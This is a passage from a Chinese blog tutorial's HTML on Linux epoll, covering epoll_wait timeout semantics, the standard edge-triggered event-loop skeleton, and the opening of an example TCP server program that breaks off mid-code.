style="font-family:宋体">的时候表示马上返回，为</span><span lang="EN-US" style="font-family:'Times New Roman',serif">-1</span><span style="font-family:宋体">的时候表示一直等下去，直到有事件返回，为任意正整数的时候表示等这么长的时间，如果一直没有事件，则返回。一般如果网络主循环是单独的线程的话，可以用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">-1</span><span style="font-family:宋体">来等，这样可以保证一些效率，如果是和主逻辑在同一个线程的话，则可以用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">0</span><span style="font-family:宋体">来保证主循环的效率。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_wait</span><span style="font-family:宋体">返回之后应该是一个循环，遍历所有的事件。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">几乎所有的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">程序都使用下面的框架：</span> </p> 
<div class="dp-highlighter bg_cpp" style="margin:18px 0px!important; width:1044.43px; line-height:26px; overflow:auto; padding-top:1px; font-family:Consolas,'Courier New',Courier,mono,serif; white-space:normal; background-color:rgb(231,229,220)"> 
 <div class="bar" style="padding-left:45px"> 
  <div class="tools" style="padding:3px 8px 10px 10px; color:silver; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:9px; border-left-color:rgb(153,153,153); border-left-width:3px; border-left-style:solid; background-color:rgb(248,248,248)"> 
   <strong>[cpp]</strong>  
   <a target="_blank" title="view plain" class="ViewSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">view plain</a> 
   <a target="_blank" title="copy" class="CopyToClipboard" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">copy</a> 
   <a target="_blank" title="print" class="PrintSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">print</a> 
   <a target="_blank" title="?" class="About" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">?</a> 
   <div style="left:422px; top:7943px; width:29px; height:14px; position:absolute; z-index:99"> 
   </div> 
  </div> 
 </div> 
 <ol class="dp-cpp" start="1" style="margin:0px 0px 1px 45px!important; padding:0px; border:currentColor; color:rgb(92,92,92); background-color:rgb(255,255,255)"><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">for</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">( ; ; )  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">   {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">       nfds = epoll_wait(epfd,events,20,500);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">       <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">for</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">(i=0;i&lt;nfds;++i)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">       {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">(events[i].data.fd==listenfd) </span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//有新的连接</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               connfd = accept(listenfd,(sockaddr *)&amp;clientaddr, &amp;clilen); <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//accept这个连接</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.data.fd=connfd;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.events=EPOLLIN|EPOLLET;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               epoll_ctl(epfd,EPOLL_CTL_ADD,connfd,&amp;ev); <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//将新的fd添加到epoll的监听队列中</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">( events[i].events&amp;EPOLLIN ) </span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//接收到数据，读socket</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               n = read(sockfd, line, MAXLINE)) &lt; 0    <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//读</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.data.ptr = md;     <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//md为自定义类型，添加数据</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.events=EPOLLOUT|EPOLLET;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               epoll_ctl(epfd,EPOLL_CTL_MOD,sockfd,&amp;ev);<span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//修改标识符，等待下一个循环时发送数据，异步处理的精髓</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">(events[i].events&amp;EPOLLOUT) </span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//有数据待发送，写socket</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> myepoll_data* md = (myepoll_data*)events[i].data.ptr;    </span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//取数据</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               sockfd = md-&gt;fd;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               send( sockfd, md-&gt;ptr, strlen((<span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">char</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">*)md-&gt;ptr), 0 );        </span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//发送数据</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.data.fd=sockfd;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               ev.events=EPOLLIN|EPOLLET;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               epoll_ctl(epfd,EPOLL_CTL_MOD,sockfd,&amp;ev); <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//修改标识符，等待下一个循环时接收数据</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">               <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//其他的处理</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">           }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">       }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">   }  </span> </li></ol> 
</div> 
<br style="line-height:26px; font-family:Arial; font-size:14px; white-space:normal; background-color:rgb(255,255,255)"> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <span style="orphans:2; widows:2; background-color:rgb(153,153,153)"><span style="color:rgb(255,0,0); font-family:SimHei; font-size:24px"><span lang="EN-US">epoll</span>的程序实例</span></span> </h3> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体"></span></p> 
<div class="dp-highlighter bg_cpp" style="margin:18px 0px!important; width:1044.43px; line-height:26px; overflow:auto; padding-top:1px; font-family:Consolas,'Courier New',Courier,mono,serif; white-space:normal; background-color:rgb(231,229,220)"> 
 <div class="bar" style="padding-left:45px"> 
  <div class="tools" style="padding:3px 8px 10px 10px; color:silver; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:9px; border-left-color:rgb(153,153,153); border-left-width:3px; border-left-style:solid; background-color:rgb(248,248,248)"> 
   <strong>[cpp]</strong>  
   <a target="_blank" title="view plain" class="ViewSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">view plain</a> 
   <a target="_blank" title="copy" class="CopyToClipboard" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">copy</a> 
   <a target="_blank" title="print" class="PrintSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">print</a> 
   <a target="_blank" title="?" class="About" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">?</a> 
   <div style="left:422px; top:8690px; width:29px; height:14px; position:absolute; z-index:99"> 
   </div> 
  </div> 
 </div> 
 <ol class="dp-cpp" start="1" style="margin:0px 0px 1px 45px!important; padding:0px; border:currentColor; color:rgb(92,92,92); background-color:rgb(255,255,255)"><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit"> #include &lt;stdio.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;stdlib.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;unistd.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;errno.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;sys/socket.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;netdb.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;fcntl.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;sys/epoll.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#include &lt;string.h&gt;</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="preprocessor" style="margin:0px; padding:0px; border:currentColor; color:gray; background-color:inherit">#define MAXEVENTS 64</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//函数:</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//功能:创建和绑定一个TCP socket</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//参数:端口</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//返回值:创建的socket</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">static</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span 